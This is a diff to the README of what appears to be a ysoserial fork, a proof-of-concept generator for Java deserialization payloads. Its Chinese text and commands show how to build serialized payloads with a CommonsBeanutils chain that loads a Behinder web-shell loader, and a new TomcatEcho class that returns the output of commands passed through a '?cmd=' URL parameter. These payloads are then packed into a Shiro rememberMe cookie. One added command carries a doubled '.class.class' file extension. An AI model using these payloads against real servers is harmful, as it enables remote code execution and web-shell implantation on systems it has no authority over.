@@ -24,7 +24,12 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 使用对应链进行生成反序列化文件 (这个BehinderLoader 只是一个 loader，需要配合特定的 Post 数据才能完成注入，Post 注入的数据暂时不打算公开）
 
-`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./Poc/shell/BehinderLoader.class > demo.ser`
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shell/BehinderLoader.class > demo.ser`
+
+使用 TomcatEcho 可以进行输出回显，在url中添加 `?cmd=命令` 即可获得回显
+
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shiro/TomcatEcho.class.class > echo.ser`
+
 
 指定加密模式和反序列化文件生成对应的 rememberMe
 
